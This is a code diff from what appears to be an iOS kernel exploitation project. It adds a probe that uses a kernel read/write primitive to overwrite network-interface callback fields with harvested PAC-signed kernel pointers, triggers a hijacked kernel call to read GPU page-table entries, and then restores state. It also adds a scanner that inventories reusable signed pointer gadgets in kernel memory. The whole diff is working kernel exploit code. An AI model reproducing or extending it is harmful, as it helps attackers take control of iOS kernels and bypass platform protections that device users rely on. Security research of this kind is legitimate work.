+    uint64_t fieldCallback = outer->backingIfnet +
+        CNDPhysicalKCall1IfnetCheckMultiOffset;
+    uint64_t originalX0 = 0, originalTarget = 0;
+    result = CNDPhysicalKCall1ReadU64(kernel, fieldX0, &originalX0) &&
+        CNDPhysicalKCall1ReadU64(kernel, fieldTarget, &originalTarget)
+        ? 0 : EIO;
+    report[@"uatPTEX0Field"] = CNDPhysicalKCall1Hex(fieldX0);
+    report[@"uatPTETargetField"] = CNDPhysicalKCall1Hex(fieldTarget);
+    report[@"uatPTECallbackField"] = CNDPhysicalKCall1Hex(fieldCallback);
+    report[@"uatPTEOriginalX0"] = CNDPhysicalKCall1Hex(originalX0);
+    report[@"uatPTEOriginalTarget"] = CNDPhysicalKCall1Hex(originalTarget);
+
+    bool idamChanged = false, targetChanged = false, x0Changed = false;
+    bool callbackExposed = false;
+    if (result == 0 && CNDPhysicalKCall1WriteU64Verify(
+            kernel, idamSlot,
+            stages[CND_UAT_PTE_GETPTE].signedCallback)) {
+        idamChanged = true;
+    } else if (result == 0) result = EIO;
+    if (result == 0 && CNDPhysicalKCall1WriteU64Verify(
+            kernel, fieldTarget,
+            stages[CND_UAT_PTE_APFS].signedCallback)) {
+        targetChanged = true;
+    } else if (result == 0) result = EIO;
+    if (result == 0 && CNDPhysicalKCall1WriteU64Verify(
+            kernel, fieldX0, object)) {
+        x0Changed = true;
+    } else if (result == 0) result = EIO;
+    if (result == 0 && CNDPhysicalKCall1WriteU64Verify(
+            kernel, fieldCallback,
+            stages[CND_UAT_PTE_OUTER].signedCallback)) {
+        callbackExposed = true;
+    } else if (result == 0) result = EIO;
+    report[@"uatPTEChainInstalled"] = @(callbackExposed);
+
+    int triggerResult = -1, triggerErrno = 0;
+    if (result == 0) {
+        CNDPhysicalKCall1TriggerRawSockaddr(
+            [NSString stringWithUTF8String:outer->bsdName],
+            stages[CND_UAT_PTE_IDAM].signedCallback, gpuAddress,
+            &triggerResult, &triggerErrno);
+    }
+
+    /* Quiesce the externally reachable callback first, then restore every
+     * borrowed input and finally the idle global. */
+    bool callbackSanitized = CNDPhysicalKCall1RestoreU64(
+        kernel, fieldCallback, stockSigned);
+    bool x0Restored = !x0Changed || CNDPhysicalKCall1RestoreU64(
+        kernel, fieldX0, originalX0);
+    bool targetRestored = !targetChanged || CNDPhysicalKCall1RestoreU64(
+        kernel, fieldTarget, originalTarget);
+    bool idamRestored = !idamChanged || CNDPhysicalKCall1RestoreU64(
+        kernel, idamSlot, originalIDAMSlot);
+    if (!callbackSanitized || !x0Restored || !targetRestored ||
+        !idamRestored) *criticalRestoreFailure = true;
+
+    int cleanupResult = -1, cleanupErrno = 0;
+    if (triggerResult == 0 && callbackSanitized && x0Restored &&
+        targetRestored && idamRestored) {
+        CNDPhysicalKCall1CleanupRawSockaddr(
+            [NSString stringWithUTF8String:outer->bsdName],
+            stages[CND_UAT_PTE_IDAM].signedCallback, gpuAddress,
+            &cleanupResult, &cleanupErrno);
+    }
+
+    uint64_t finalCallback = 0, finalX0 = 0, finalTarget = 0, finalIDAM = 0;
+    bool finalRead = CNDPhysicalKCall1ReadU64(
+            kernel, fieldCallback, &finalCallback) &&
+        CNDPhysicalKCall1ReadU64(kernel, fieldX0, &finalX0) &&
+        CNDPhysicalKCall1ReadU64(kernel, fieldTarget, &finalTarget) &&
+        CNDPhysicalKCall1ReadU64(kernel, idamSlot, &finalIDAM);
+    uint32_t pteLow32 = (uint32_t)triggerErrno;
+    bool pteLooksValid = triggerResult == -1 &&
+        (pteLow32 & 1u) != 0 && pteLow32 > 0x4000u;
+    report[@"uatPTETriggerResult"] = @(triggerResult);
+    report[@"uatPTETriggerErrno"] = @(triggerErrno);
+    report[@"uatPTEObservedLow32"] = CNDPhysicalKCall1Hex(pteLow32);
+    report[@"uatPTEObservedValidBit"] = @((pteLow32 & 1u) != 0);
+    report[@"uatPTECleanupResult"] = @(cleanupResult);
+    report[@"uatPTECleanupErrno"] = @(cleanupErrno);
+    report[@"uatPTECallbackSanitized"] = @(callbackSanitized);
+    report[@"uatPTEX0Restored"] = @(x0Restored);
+    report[@"uatPTETargetRestored"] = @(targetRestored);
+    report[@"uatPTEIDAMRestored"] = @(idamRestored);
+    report[@"uatPTEFinalReadResult"] = @(finalRead ? 0 : EIO);
+    report[@"uatPTEFinalCallback"] = CNDPhysicalKCall1Hex(finalCallback);
+    report[@"uatPTEFinalX0"] = CNDPhysicalKCall1Hex(finalX0);
+    report[@"uatPTEFinalTarget"] = CNDPhysicalKCall1Hex(finalTarget);
+    report[@"uatPTEFinalIDAMSlot"] = CNDPhysicalKCall1Hex(finalIDAM);
+    report[@"uatPTEFullValueRecovered"] = @NO;
+
+    bool restored = callbackSanitized && x0Restored && targetRestored &&
+        idamRestored && finalRead && finalCallback == stockSigned &&
+        finalX0 == originalX0 && finalTarget == originalTarget &&
+        finalIDAM == originalIDAMSlot;
+    bool success = result == 0 && pteLooksValid && restored &&
+        !*criticalRestoreFailure;
+    report[@"uatPTELow32LooksValid"] = @(pteLooksValid);
+    report[@"uatPTERestorationExact"] = @(restored);
+    report[@"uatPTESuccess"] = @(success);
+    return success ? 0 : (result != 0 ? result : EIO);
+}
+
+static NSDictionary<NSString *, id> *
+CNDPhysicalKCall1RunSignerInventoryOnce(void)
 {
     NSArray<NSString *> *documents = NSSearchPathForDirectoriesInDomains(
         NSDocumentDirectory, NSUserDomainMask, YES);
     NSString *directory = documents.firstObject ?: NSTemporaryDirectory();
     NSString *reportPath = [directory stringByAppendingPathComponent:
-        @"CNDPhysicalKCall1Probe.json"];
+        @"CNDPhysicalKCall1SignerInventory.json"];
+    NSMutableDictionary<NSString *, id> *report = [@{
+        @"schema": @"com.zeroxjf.cyanide.uat-signer-inventory",
+        @"schemaVersion": @1,
+        @"productType": CNDPhysicalKCall1SysctlString("hw.machine"),
+        @"productBuildVersion":
+            CNDPhysicalKCall1SysctlString("kern.osversion"),
+        @"mode": @"read-only-existing-signature-inventory",
+        @"kernelReadUsed": @YES,
+        @"kernelWriteUsed": @NO,
+        @"kernelCallUsed": @NO,
+        @"krwAcquisitionAttempted": @NO,
+        @"krwCleanupAttempted": @NO,
+        @"macLabelReadAttempted": @NO,
+        @"macLabelWriteAttempted": @NO,
+        @"serviceOpenInvoked": @NO,
+        @"selectorInvoked": @NO,
+        @"ioctlInvoked": @NO,
+        @"callbackInvoked": @NO,
+        @"callbackWriteAttempted": @NO,
+        @"globalSlotWriteAttempted": @NO,
+        @"metalUsed": @NO,
+        @"pointerSubstitution": @NO,
+        @"signatureContext": @"IA/0xe4fe",
+        @"signatureContextEvidence":
+            @"byte-exact initIfnetParams signer sequence plus field provenance; raw PAC is not independently decoded",
+        @"inventoryComplete": @NO,
+        @"completeSignerSetFound": @NO,
+        @"reportPath": reportPath,
+        @"state": @"starting",
+    } mutableCopy];
+    CNDPhysicalKCall1Persist(report, reportPath, nil, nil);
+
+    if (![report[@"productType"]
+            isEqualToString:@CND_PHYSICAL_KCALL1_EXPECTED_PRODUCT] ||
+        ![report[@"productBuildVersion"]
+            isEqualToString:@CND_PHYSICAL_KCALL1_EXPECTED_BUILD]) {
+        CNDPhysicalKCall1Persist(report, reportPath, @"result",
+            @"refused-unsupported-device");
+        return report;
+    }
+
+    CNDPhysicalKCall1KernelAPI kernel = {0};
+    CNDPhysicalKCall1IOKitAPI iokit = {0};
+    if (!CNDPhysicalKCall1ResolveReadOnlyKernelAPI(&kernel) ||
+        !CNDPhysicalKCall1ResolveReadOnlyIOKitAPI(&iokit)) {
+        CNDPhysicalKCall1Persist(report, reportPath, @"result",
+            @"refused-read-only-api-unavailable");
+        if (iokit.handle != NULL) dlclose(iokit.handle);
+        return report;
+    }
+    if (!kernel.krwReady()) {
+        CNDPhysicalKCall1Persist(report, reportPath, @"result",
+            @"refused-krw-not-ready");
+        dlclose(iokit.handle);
+        return report;
+    }
+
+    uint64_t kernelBase = *kernel.kernelBase;
+    uint64_t slide = *kernel.kernelSlide;
+    report[@"kernelBase"] = CNDPhysicalKCall1Hex(kernelBase);
+    report[@"kernelSlide"] = CNDPhysicalKCall1Hex(slide);
+    bool baseValid =
+        kernelBase == CNDPhysicalKCall1StaticKernelBase + slide &&
+        slide <= CND_PHYSICAL_KCALL1_SLIDE_MAX &&
+        (slide & UINT64_C(0x3fff)) == 0;
+    report[@"kernelBaseMatchesContainer"] = @(baseValid);
+    struct mach_header_64 header = {0};
+    bool headerValid = baseValid && CNDPhysicalKCall1ReadBytes(
+        &kernel, kernelBase, &header, sizeof(header)) &&
+        header.magic == MH_MAGIC_64 && header.filetype == MH_FILESET;
+    report[@"kernelHeaderMagic"] = CNDPhysicalKCall1Hex(header.magic);
+    report[@"kernelHeaderFiletype"] = @(header.filetype);
+    if (!headerValid) {
+        CNDPhysicalKCall1Persist(report, reportPath, @"result",
+            @"refused-kernel-identity");
+        dlclose(iokit.handle);
+        return report;
+    }
+
+    uint64_t stockTarget = CNDPhysicalKCall1StaticEtherCheckMulti + slide;
+    uint64_t apfsTarget = CNDPhysicalKCall1StaticAPFSX1Dispatcher + slide;
+    uint64_t getPTETarget = CNDPhysicalKCall1StaticIOUATGetPTE + slide;
+    uint64_t outerTarget =
+        CNDPhysicalKCall1StaticIfnetX0Dispatcher + slide;
+    uint64_t signerAddress =
+        CNDPhysicalKCall1StaticCheckMultiSigner + slide;
+    uint32_t signerInstructions[3] = {0};
+    uint32_t apfsInstructions[4] = {0};
+    uint32_t getPTEInstructions[8] = {0};
+    uint32_t outerInstructions[7] = {0};
+    bool signerExact = CNDPhysicalKCall1ReadBytes(&kernel,
+            signerAddress - sizeof(uint32_t), signerInstructions,
+            sizeof(signerInstructions)) &&
+        memcmp(signerInstructions,
+            CNDPhysicalKCall1ExpectedCheckMultiSigner,
+            sizeof(signerInstructions)) == 0;
+    bool apfsExact = CNDPhysicalKCall1ReadBytes(&kernel, apfsTarget,
+            apfsInstructions, sizeof(apfsInstructions)) &&
+        memcmp(apfsInstructions,
+            CNDPhysicalKCall1ExpectedAPFSX1Dispatcher,
+            sizeof(apfsInstructions)) == 0;
+    bool getPTEExact = CNDPhysicalKCall1ReadBytes(&kernel, getPTETarget,
+            getPTEInstructions, sizeof(getPTEInstructions)) &&
+        memcmp(getPTEInstructions, CNDPhysicalKCall1ExpectedIOUATGetPTE,
+            sizeof(getPTEInstructions)) == 0;
+    bool outerExact = CNDPhysicalKCall1ReadBytes(&kernel, outerTarget,
+            outerInstructions, sizeof(outerInstructions)) &&
+        memcmp(outerInstructions, CNDPhysicalKCall1ExpectedDispatcher,
+            sizeof(outerInstructions)) == 0;
+    bool codeWitnessesExact = signerExact && apfsExact &&
+        getPTEExact && outerExact;
+    report[@"stockTarget"] = CNDPhysicalKCall1Hex(stockTarget);
+    report[@"apfsTarget"] = CNDPhysicalKCall1Hex(apfsTarget);
+    report[@"getPTETarget"] = CNDPhysicalKCall1Hex(getPTETarget);
+    report[@"outerTarget"] = CNDPhysicalKCall1Hex(outerTarget);
+    report[@"signerAddress"] = CNDPhysicalKCall1Hex(signerAddress);
+    report[@"signerSequenceExact"] = @(signerExact);
+    report[@"apfsInstructionsExact"] = @(apfsExact);
+    report[@"getPTEInstructionsExact"] = @(getPTEExact);
+    report[@"outerInstructionsExact"] = @(outerExact);
+    report[@"codeWitnessesExact"] = @(codeWitnessesExact);
+    if (!codeWitnessesExact) {
+        CNDPhysicalKCall1Persist(report, reportPath, @"result",
+            @"refused-code-witness-mismatch");
+        dlclose(iokit.handle);
+        return report;
+    }
+
+    const size_t dispatcherCount =
+        sizeof(CNDPhysicalKCall1GlobalDispatchers) /
+        sizeof(CNDPhysicalKCall1GlobalDispatchers[0]);
+    uint64_t initialSlots[sizeof(CNDPhysicalKCall1GlobalDispatchers) /
+        sizeof(CNDPhysicalKCall1GlobalDispatchers[0])] = {0};
+    bool initialSlotReads[sizeof(CNDPhysicalKCall1GlobalDispatchers) /
+        sizeof(CNDPhysicalKCall1GlobalDispatchers[0])] = {0};
+    NSMutableArray<NSMutableDictionary<NSString *, id> *> *dispatchers =
+        [NSMutableArray array];
+    NSUInteger idleDispatcherCount = 0;
+    for (size_t index = 0; index < dispatcherCount; index++) {
+        const CNDPhysicalKCall1GlobalDispatcher *candidate =
+            &CNDPhysicalKCall1GlobalDispatchers[index];
+        uint64_t target = candidate->target + slide;
+        uint64_t slot = candidate->slot + slide;
+        uint8_t family = (uint8_t)((target >> 8) & 0xff);
+        uint32_t instructions[7] = {0};
+        bool familyOK = family == AF_UNSPEC || family == AF_LINK;
+        bool instructionsExact = familyOK &&
+            CNDPhysicalKCall1ReadBytes(&kernel, target, instructions,
+                sizeof(instructions)) &&
+            memcmp(instructions, candidate->instructions,
+                sizeof(instructions)) == 0;
+        initialSlotReads[index] = instructionsExact &&
+            CNDPhysicalKCall1ReadU64(
+                &kernel, slot, &initialSlots[index]);
+        bool idle = initialSlotReads[index] && initialSlots[index] == 0;
+        if (idle) idleDispatcherCount++;
+        [dispatchers addObject:[@{
+            @"name": [NSString stringWithUTF8String:candidate->name]
+                ?: @"",
+            @"target": CNDPhysicalKCall1Hex(target),
+            @"slot": CNDPhysicalKCall1Hex(slot),
+            @"sockaddrFamily": @(family),
+            @"familyAccepted": @(familyOK),
+            @"instructionsExact": @(instructionsExact),
+            @"initialSlotRead": @(initialSlotReads[index]),
+            @"initialSlotValue": CNDPhysicalKCall1Hex(initialSlots[index]),
+            @"initialSlotIdle": @(idle),
+        } mutableCopy]];
+    }
+    report[@"globalDispatcherCandidates"] = dispatchers;
+    report[@"idleDispatcherCount"] = @(idleDispatcherCount);
+
+    uint64_t uatGlobal = CNDPhysicalKCall1StaticIOUATGlobal + slide;
+    uint64_t objectRaw = 0, recordRaw = 0, objectRecordRaw = 0;
+    bool ownerRead = CNDPhysicalKCall1ReadU64(
+            &kernel, uatGlobal + 0x28, &objectRaw) &&
+        CNDPhysicalKCall1ReadU64(
+            &kernel, uatGlobal + 0x18, &recordRaw);
+    uint64_t object = CNDPhysicalKCall1StripDataPointer(objectRaw);
+    uint64_t record = CNDPhysicalKCall1StripDataPointer(recordRaw);
+    if (ownerRead && CNDPhysicalKCall1KernelObject(object)) {
+        ownerRead = CNDPhysicalKCall1ReadU64(
+            &kernel, object + 0x20, &objectRecordRaw);
+    }
+    uint64_t objectRecord =
+        CNDPhysicalKCall1StripDataPointer(objectRecordRaw);
+    bool ownerJoin = ownerRead && CNDPhysicalKCall1KernelObject(object) &&
+        CNDPhysicalKCall1KernelObject(record) && objectRecord == record;
+    report[@"uatGlobal"] = CNDPhysicalKCall1Hex(uatGlobal);
+    report[@"uatObjectRaw"] = CNDPhysicalKCall1Hex(objectRaw);
+    report[@"uatObject"] = CNDPhysicalKCall1Hex(object);
+    report[@"uatGlobalRecord"] = CNDPhysicalKCall1Hex(record);
+    report[@"uatObjectRecord"] = CNDPhysicalKCall1Hex(objectRecord);
+    report[@"uatOwnerJoin"] = @(ownerJoin);
+    if (!ownerJoin) {
+        CNDPhysicalKCall1Persist(report, reportPath, @"result",
+            @"refused-owner-binding-mismatch");
+        dlclose(iokit.handle);
+        return report;
+    }
+
+    uint64_t selfTask = kernel.taskSelf();
+    report[@"selfTask"] = CNDPhysicalKCall1Hex(selfTask);
+    if (!CNDPhysicalKCall1KernelObject(selfTask)) {
+        CNDPhysicalKCall1Persist(report, reportPath, @"result",
+            @"refused-self-task");
+        dlclose(iokit.handle);
+        return report;
+    }
+
+    NSMutableSet<NSString *> *seenRegistryIDs = [NSMutableSet set];
+    NSMutableArray<NSDictionary<NSString *, id> *> *entries =
+        [NSMutableArray array];
+    NSMutableDictionary<NSString *, NSNumber *> *roleCounts =
+        [@{ @"stock": @0, @"apfs-x1": @0, @"idam-global": @0,
+             @"get-pte": @0, @"outer-x0": @0 } mutableCopy];
+    NSMutableArray<NSDictionary<NSString *, id> *> *queryResults =
+        [NSMutableArray array];
+    BOOL truncated = NO;
+    CNDPhysicalKCall1InventoryClass(&kernel, &iokit, selfTask, slide,
+        "IONetworkInterface", seenRegistryIDs, entries, roleCounts,
+        queryResults, &truncated);
+    CNDPhysicalKCall1InventoryClass(&kernel, &iokit, selfTask, slide,
+        "IOUserEthernetInterface", seenRegistryIDs, entries, roleCounts,
+        queryResults, &truncated);
+
+    bool slotsStable = true;
+    for (size_t index = 0; index < dispatcherCount; index++) {
+        const CNDPhysicalKCall1GlobalDispatcher *candidate =
+            &CNDPhysicalKCall1GlobalDispatchers[index];
+        uint64_t finalValue = 0;
+        bool finalRead = CNDPhysicalKCall1ReadU64(
+            &kernel, candidate->slot + slide, &finalValue);
+        bool stable = initialSlotReads[index] && finalRead &&
+            finalValue == initialSlots[index];
+        slotsStable = slotsStable && stable;
+        dispatchers[index][@"finalSlotRead"] = @(finalRead);
+        dispatchers[index][@"finalSlotValue"] =
+            CNDPhysicalKCall1Hex(finalValue);
+        dispatchers[index][@"slotStable"] = @(stable);
+    }
+
+    bool inventoryComplete = slotsStable && !truncated;
+    bool completeSignerSet = inventoryComplete &&
+        [roleCounts[@"stock"] unsignedIntegerValue] > 0 &&
+        [roleCounts[@"apfs-x1"] unsignedIntegerValue] > 0 &&
+        [roleCounts[@"idam-global"] unsignedIntegerValue] > 0 &&
+        [roleCounts[@"get-pte"] unsignedIntegerValue] > 0 &&
+        [roleCounts[@"outer-x0"] unsignedIntegerValue] > 0;
+    report[@"interfaceQueries"] = queryResults;
+    report[@"interfaces"] = entries;
+    report[@"interfaceCount"] = @(entries.count);
+    report[@"inventoryLimit"] =
+        @(CNDPhysicalKCall1SignerInventoryMaxInterfaces);
+    report[@"inventoryTruncated"] = @(truncated);
+    report[@"roleCounts"] = roleCounts;
+    report[@"globalSlotsStable"] = @(slotsStable);
+    report[@"inventoryComplete"] = @(inventoryComplete);
+    report[@"completeSignerSetFound"] = @(completeSignerSet);
+    CNDPhysicalKCall1Persist(report, reportPath, @"result",
+        completeSignerSet ? @"found-complete-existing-signer-set"
+                          : @"no-complete-existing-signer-set");
+    dlclose(iokit.handle);
+    return report;
+}
+
+static NSDictionary<NSString *, id> *CNDPhysicalKCall1RunOnce(BOOL uatPTE)
+{
+    NSArray<NSString *> *documents = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES);
+    NSString *directory = documents.firstObject ?: NSTemporaryDirectory();
+    NSString *reportPath = [directory stringByAppendingPathComponent:
+        uatPTE ? @"CNDPhysicalKCall1UatPTEProbe.json"
+               : @"CNDPhysicalKCall1Probe.json"];
     NSMutableDictionary<NSString *, id> *report =
         [@{
-            @"schema": @"com.zeroxjf.cyanide.physical-kcall1-probe",
+            @"schema": uatPTE
+                ? @"com.zeroxjf.cyanide.physical-kcall1-uat-pte-probe"
+                : @"com.zeroxjf.cyanide.physical-kcall1-probe",
             @"schemaVersion": @1,
             @"productType": CNDPhysicalKCall1SysctlString("hw.machine"),
             @"productBuildVersion":
@@ -1218,7 +2175,7 @@ static NSDictionary<NSString *, id> *CNDPhysicalKCall1RunOnce(void)
                 @"com.apple.networking.ethernet.user-access",
             @"kernelReadUsed": @YES,
             @"kernelWriteUsed": @NO,
-            @"kernelCallUsed": @NO,
+            @"kernelCallUsed": @(uatPTE),
             @"providerUsed": @NO,
             @"krwSource": @"app kexploit (kreadbuf/kwrite64, "
                 "kexploit_early_kwrite32bytes_checked)",
@@ -1229,8 +2186,11 @@ static NSDictionary<NSString *, id> *CNDPhysicalKCall1RunOnce(void)
             ],
             @"labelWriteScope":
                 @"self MAC label base, exactly 0x20 physical bytes",
-            @"canary": @"ifnet kcall1 chosen-PC/chosen-X0",
+            @"canary": uatPTE
+                ? @"mediated IOUAT getPageTableEntry over a live Metal VA"
+                : @"ifnet kcall1 chosen-PC/chosen-X0",
             @"ifnetKCall1Success": @NO,
+            @"uatPTESuccess": @NO,
             @"reportPath": reportPath,
             @"state": @"starting",
         } mutableCopy];
@@ -1479,9 +2439,13 @@ static NSDictionary<NSString *, id> *CNDPhysicalKCall1RunOnce(void)
     kern_return_t lastCallKR = KERN_FAILURE;
     uint64_t lastControllerCookie = 0;
     bool criticalRestoreFailure = false;
-    int canaryResult = CNDPhysicalKCall1RunCanary(&kernel, &iokit, slide,
-        connection, selfTask, knownIDs, report, &after, &lastCallKR,
-        &lastControllerCookie, &criticalRestoreFailure);
+    int canaryResult = uatPTE
+        ? CNDPhysicalKCall1RunUatPTE(&kernel, &iokit, slide,
+            connection, selfTask, knownIDs, report, &after, &lastCallKR,
+            &lastControllerCookie, &criticalRestoreFailure)
+        : CNDPhysicalKCall1RunCanary(&kernel, &iokit, slide,
+            connection, selfTask, knownIDs, report, &after, &lastCallKR,
+            &lastControllerCookie, &criticalRestoreFailure);
     report[@"callKR"] = CNDPhysicalKCall1Hex((uint32_t)lastCallKR);
     report[@"controllerCookie"] =
         CNDPhysicalKCall1Hex(lastControllerCookie);
@@ -1490,19 +2454,23 @@ static NSDictionary<NSString *, id> *CNDPhysicalKCall1RunOnce(void)
     report[@"kcall1Result"] = @(canaryResult);
 
     bool success = canaryResult == 0 &&
-        [report[@"ifnetKCall1Success"] boolValue] &&
+        [report[uatPTE ? @"uatPTESuccess" : @"ifnetKCall1Success"] boolValue] &&
         !criticalRestoreFailure;
     NSString *failure = @"trigger-failed";
     if (criticalRestoreFailure) {
         failure = @"critical-restore-failure";
-    } else if ([report[@"ifnetKCall1SetupResult"] intValue] != 0) {
+    } else if ([report[uatPTE ? @"uatPTESetupResult"
+                            : @"ifnetKCall1SetupResult"] intValue] != 0) {
         /* GOT/stock-pointer or stub bytes refused: nothing was armed. */
         failure = @"canary-setup-refused";
-    } else if ([report[@"ifnetKCall1SignerStagesResult"] intValue] != 0) {
+    } else if ([report[uatPTE ? @"uatPTESignerStagesResult"
+                            : @"ifnetKCall1SignerStagesResult"] intValue] != 0) {
         failure = @"canary-stage-refused";
     }
     CNDPhysicalKCall1Persist(report, reportPath, @"result", success
-        ? @"physical-krw-kcall1-chosen-pc-chosen-x0" : failure);
+        ? (uatPTE ? @"observed-live-metal-pte-low32"
+                  : @"physical-krw-kcall1-chosen-pc-chosen-x0")
+        : failure);
 
     if (MACH_PORT_VALID(connection)) (void)iokit.serviceClose(connection);
     if (acquired) {
@@ -1539,7 +2507,54 @@ BOOL CNDPhysicalKCall1ProbeIsRunning(void)
     return __sync_fetch_and_add(&gCNDPhysicalKCall1ProbeRunning, 0) != 0;
 }
 
+static void CNDPhysicalKCall1ProbeRunMode(
+    BOOL uatPTE, CNDPhysicalKCall1ProbeCompletion completion)
+{
+    if (!__sync_bool_compare_and_swap(
+            &gCNDPhysicalKCall1ProbeRunning, 0, 1)) {
+        dispatch_async(dispatch_get_main_queue(), ^{
+            completion(@{
+                @"result": @"refused-already-running",
+                @"message": @"The physical kcall1 probe is already running.",
+            });
+        });
+        return;
+    }
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        NSDictionary<NSString *, id> *report =
+            CNDPhysicalKCall1RunOnce(uatPTE);
+        __sync_lock_release(&gCNDPhysicalKCall1ProbeRunning);
+        /* RunOnce has returned from every path by now, so stamp the terminal
+         * state on the report it built.  Without this a finished report keeps
+         * carrying its last in-flight state ("initializing-offsets",
+         * "acquiring-physical-krw", …) and reads as unfinished, which is what
+         * a reader of the JSON sees after the run has ended.  The object
+         * RunOnce returns is the mutable dictionary it persisted. */
+        if ([report isKindOfClass:NSMutableDictionary.class]) {
+            NSMutableDictionary<NSString *, id> *finished =
+                (NSMutableDictionary<NSString *, id> *)report;
+            CNDPhysicalKCall1Persist(finished, finished[@"reportPath"],
+                @"state", @"finished");
+        }
+        dispatch_async(dispatch_get_main_queue(), ^{
+            completion(report ?: @{ @"result": @"unknown-result" });
+        });
+    });
+}
+
 void CNDPhysicalKCall1ProbeRun(
+    CNDPhysicalKCall1ProbeCompletion completion)
+{
+    CNDPhysicalKCall1ProbeRunMode(NO, completion);
+}
+
+void CNDPhysicalKCall1UatPTEProbeRun(
+    CNDPhysicalKCall1ProbeCompletion completion)
+{
+    CNDPhysicalKCall1ProbeRunMode(YES, completion);
+}
+
+void CNDPhysicalKCall1UatSignerInventoryRun(
     CNDPhysicalKCall1ProbeCompletion completion)
 {
     if (!__sync_bool_compare_and_swap(
@@ -1553,14 +2568,9 @@ void CNDPhysicalKCall1ProbeRun(
         return;
     }
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        NSDictionary<NSString *, id> *report = CNDPhysicalKCall1RunOnce();
+        NSDictionary<NSString *, id> *report =
+            CNDPhysicalKCall1RunSignerInventoryOnce();
         __sync_lock_release(&gCNDPhysicalKCall1ProbeRunning);
-        /* RunOnce has returned from every path by now, so stamp the terminal
-         * state on the report it built.  Without this a finished report keeps
-         * carrying its last in-flight state ("initializing-offsets",
-         * "acquiring-physical-krw", …) and reads as unfinished, which is what
-         * a reader of the JSON sees after the run has ended.  The object
-         * RunOnce returns is the mutable dictionary it persisted. */
         if ([report isKindOfClass:NSMutableDictionary.class]) {
             NSMutableDictionary<NSString *, id> *finished =
                 (NSMutableDictionary<NSString *, id> *)report;
